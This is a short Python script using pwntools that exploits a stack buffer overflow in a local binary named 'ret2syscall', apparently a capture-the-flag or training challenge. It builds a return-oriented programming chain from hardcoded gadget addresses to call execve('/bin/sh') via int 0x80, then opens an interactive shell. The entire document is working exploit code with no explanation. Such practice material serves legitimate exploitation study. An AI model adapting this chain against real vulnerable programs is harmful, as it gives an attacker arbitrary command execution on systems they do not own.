from pwn import *

eax_ret_addr = 0x080bb196
ebx_ecx_edx_ret_addr = 0x0806eb90
bin_sh_addr = 0x080be408
int_0x80_addr = 0x08049421

payload = b'A' * 112 + p32(eax_ret_addr) + p32(0xb) + p32(ebx_ecx_edx_ret_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr)

sh = process('./ret2syscall')

sh.sendline(payload)
sh.interactive()